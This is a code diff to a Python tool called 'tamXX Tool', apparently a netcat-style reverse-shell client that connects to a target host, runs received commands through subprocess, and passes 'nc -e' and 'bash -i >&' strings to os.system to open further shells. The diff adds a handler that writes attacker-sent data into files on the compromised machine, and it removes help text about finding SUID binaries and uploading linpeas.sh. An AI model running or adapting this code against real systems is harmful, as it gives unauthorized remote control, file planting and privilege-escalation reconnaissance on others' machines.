@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 import socket
-import sys, os
+import sys, os, time
 import subprocess
 
 class netcatCli(object):
@@ -15,23 +15,13 @@ class netcatCli(object):
         print("""
         tamXX Tool :\n
         [OPTIONS] :
-        \t\t-l , --listen\t\t\t-     listen on [host]:[port] for incoming connections
         \t\t--target [IP]\t\t\t-     target
         \t\t-p , --port [PORT]\t\t\t-     port
         \t\t--prompt\t\t\t-     initialize prompt
         \t\t-h , --help\t\t\t-     get some help ;)
         """)
         sys.exit()
-    def usageOn(self):
-        print("""
-            WE ARE ON ! WHAT CAN I DO ?
-            [OPTIONS] :
-            \t\tFirst, you can execute almost same commands like real shell!
-            \t\thelp\t\tget some help ;)
-            \t\tsuid\t\tget all suid binaries !
-            \t\tlinpeas\t\tupload linpeas.sh on machine
-            \t\tshell\t\tget full interactive shell
-            """)
+
 
 
     def main(self):
@@ -90,6 +80,13 @@ class netcatCli(object):
             elif 'whoami' in recv or "pwd" in recv:
                 output = subprocess.getoutput(recv)
                 s.send(output.encode())
+            elif "upload" in recv:
+                recv = recv.split(' ')
+                filename = "".join(recv[2:])
+                if ";" in filename:
+                    filename = filename.replace(";",'.')
+                self.download(s,filename)
+                s.send(b"UPLOADED !")
             elif 'nc -e' in recv or 'bash -i >&' in recv:
                 os.system(recv)
                 s.send(b"\n[*] OPEN NEW SHELL\n")
@@ -102,6 +99,23 @@ class netcatCli(object):
                 #CMD = subprocess.Popen(recv, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                 #s.send(CMD.stdout.read())
                 #s.send(CMD.stderr.read())
+
+    def download(self,conn,dest):
+        bufferSize = 2**18
+        try:
+            f=open(dest,"a")
+            content = conn.recv(bufferSize).decode()
+            f.write(content)
+            fini = "false"
+            while fini == "false":
+                content = conn.recv(bufferSize).decode()
+                time.sleep(1)
+                f.write(content)
+                if len(content) < bufferSize:
+                    fini = "true"
+            f.close()
+        except PermissionError:
+            print("PermissionError")
 
 
 if __name__ == "__main__":
